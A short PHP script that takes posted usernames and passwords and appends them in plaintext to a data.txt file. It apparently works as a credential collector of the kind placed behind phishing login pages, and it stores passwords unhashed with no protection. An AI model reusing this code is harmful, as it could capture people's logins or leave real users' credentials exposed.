<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $u = $_POST['username'];
    $p = $_POST['password'];

    $data = "Username: $u | Password: $p\n";
    file_put_contents("data.txt", $data, FILE_APPEND);

    echo "Saved successfully";
}
?>